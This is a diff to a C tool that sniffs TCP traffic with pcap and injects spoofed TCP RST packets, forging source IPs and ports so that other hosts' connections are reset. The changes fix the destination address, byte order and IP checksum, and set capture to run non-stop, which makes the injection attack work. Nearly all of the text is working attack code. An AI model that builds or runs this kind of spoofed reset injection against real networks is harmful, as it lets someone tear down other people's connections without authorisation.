@@ -24,7 +24,7 @@
 #include <arpa/inet.h>
 #include <signal.h>
 #include <unistd.h> 
- 
+    
 #define __USE_BSD         /* Using BSD IP header           */ 
 #include <netinet/ip.h>   /* Internet Protocol             */ 
 #define __FAVOR_BSD       /* Using BSD TCP header          */ 
@@ -51,7 +51,7 @@
 This should be autodetected...
 */
 
-#define CAPTURE_COUNT 2           /* number of packets to capture, -1: non-stop */
+#define CAPTURE_COUNT -1           /* number of packets to capture, -1: non-stop */
 
 /* Ethernet header */
 struct sniff_ethernet {
@@ -251,7 +251,6 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     int size_ip;
     int size_tcp;
     int size_payload;
-    u_short ipcsum, tcpcsum;
     
     char srcHost[17];
     char dstHost[17];
@@ -356,7 +355,7 @@ void createRSTpacket(struct  in_addr srcip, struct  in_addr destip, u_short spor
         perror("setsockopt: ");
     }
 
-    strncpy(temp_addr, inet_ntoa(srcip), 16); /*BUG: destip or srcip?*/
+    strncpy(temp_addr, inet_ntoa(destip), 16); /*BUG: destip or srcip?*/
     dstaddr.sin_family = AF_INET;
     dstaddr.sin_port = dport;
     inet_pton(AF_INET, temp_addr, &dstaddr.sin_addr);
@@ -364,19 +363,25 @@ void createRSTpacket(struct  in_addr srcip, struct  in_addr destip, u_short spor
     memset (datagram, 0, 4096);          /* zero out the buffer */
     iph->ip_vhl = 0x45;                  /* version=4,header_length=5 */
     iph->ip_tos = 0;                     /* type of service not needed */
-    iph->ip_len = (IPTCPHDRSIZE);        /* no payload for RST */
-                                         /* wierd thing [TODO][BUG]:
-                                                htons() for linux
-                                                no htons for mac os x/BSD 
+    iph->ip_len = htons(IPTCPHDRSIZE);   /* no payload for RST */
+                                         /* 
+                                            wierd thing [TODO][BUG]:
+                                            htons() for linux
+                                            no htons for mac os x/BSD 
                                          */
     iph->ip_id  = ident;                 /* ID */
     iph->ip_off = 0;                     /* no fragmentation */
-    iph->ip_ttl = ttl;                    /* Time to Live, default:255 */
-    iph->ip_p   = IPPROTO_TCP;           /* IPPROTO_TCP or IPPROTO_UDP */
+    iph->ip_ttl = ttl;                   /* Time to Live, default:255 */
     iph->ip_src = srcip;                 /* faking source device IP */
     iph->ip_dst = destip;                /* target destination address */
-    iph->ip_sum = 0;                    /* Checksum. (Zero until computed)  */
+    iph->ip_sum = 0;                     /* Checksum. (Zero until computed)  */
 
+    inet_pton(AF_INET, inet_ntoa(srcip), &iph->ip_src);
+    inet_pton(AF_INET, inet_ntoa(destip), &iph->ip_dst);
+    
+    iph->ip_p   = IPPROTO_TCP;           /* IPPROTO_TCP or IPPROTO_UDP */
+    
+    
     /* From RFC793
       In all states except SYN-SENT, all reset (RST) segments are validated
       by checking their SEQ-fields.  A reset is valid if its sequence number
@@ -395,7 +400,9 @@ void createRSTpacket(struct  in_addr srcip, struct  in_addr destip, u_short spor
                                         
     tcph->th_sport = sport;              /* faking source port */
     tcph->th_dport = dport;              /* target destination port */
-    tcph->th_seq   = seq;                /* the random SYN sequence */
+    tcph->th_seq   = seq;                /* SYN sequence the should be 
+                                            incremented in one dir and
+                                            echoed in the other */
     tcph->th_ack   = ack;                /* No ACK needed? or echo ACK?*/
     tcph->th_offx2 = 0x50;               /* 50h (5 offset) ( 8 0s reserved )*/
     tcph->th_flags = TH_RST;             /* initial connection request FLAG*/
@@ -413,23 +420,22 @@ void createRSTpacket(struct  in_addr srcip, struct  in_addr destip, u_short spor
                     /* in bytes the tcp segment length default:0x14*/
                     
     tcph->th_sum = in_cksum((unsigned short *)(tcph), IPTCPHDRSIZE);
-    printf(" TCP sum=%x\t",tcph->th_sum);
+    iph->ip_sum = in_cksum((unsigned short *)iph, IPHDRSIZE); 
+    printf("\tIP sum=%x %x\t",iph->ip_sum, tcph->th_sum);
 
-    iph->ip_sum = checksum_comp((unsigned short *)iph, IPHDRSIZE); 
-    printf(" IP sum=%x\n",iph->ip_sum);
+    /*printf("RST packet IP Header\n");*/
+    showPacketDetails(iph, tcph);
+    /*Why is the IP Checksum same for both RST packets? while the TCP Checksum is different*/
     
-
     if (sendto(sockfd, datagram, IPTCPHDRSIZE, 0, (struct sockaddr *)&dstaddr, sizeof(dstaddr)) < 0) {
         fprintf(stderr, "Error sending datagram: from port %d to port %d\n", 
                 ntohs(sport), ntohs(dport));
         perror("sendto: ");
     }
     else {
-        printf("Packet sent to address: %s\n", inet_ntoa(dstaddr.sin_addr));
+        printf("Packet sent to address: %s %d\n", inet_ntoa(dstaddr.sin_addr), ntohs(dstaddr.sin_port));
     }
     
-    /*printf("RST packet IP Header\n");*/
-    showPacketDetails(iph, tcph);
     close(sockfd);
     #endif
 }
